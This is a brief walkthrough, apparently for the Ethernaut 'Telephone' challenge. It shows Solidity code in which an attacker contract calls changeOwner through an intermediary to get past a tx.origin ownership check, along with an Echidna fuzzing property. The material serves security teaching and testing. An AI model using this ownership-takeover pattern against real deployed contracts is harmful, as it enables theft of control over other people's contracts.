# Telephone Walkthrough
This walkthrough requires interacting with the target via a different contract. This gives us two different ways in which we can run this test. The first way is to let our test contract call the attacker contract. The other way, which maybe more realistic, is to let the fuzzer call the attack contract. 

## Setup 1
## Test Setup 1

In this test we will use two contracts and the constructor 
```javascript
pragma solidity ^0.6.0;

import './Telephone.sol';

contract RingRing {
  Test phone = Test(0x4242);
  
  function pwn() public {
    phone.changeOwner(address(0x10000));
  }
}

contract Test is Telephone {
    RingRing ring;
  constructor() Telephone() public payable {
    // hint echidna
    ring = new RingRing();
  }

  function callPwn() public {
      ring.pwn();
  }

    function echidna_test_origin() public returns (bool) {
        if (tx.origin == owner) {
            return false;
        } else {
            return true;
        }
    }    
}
```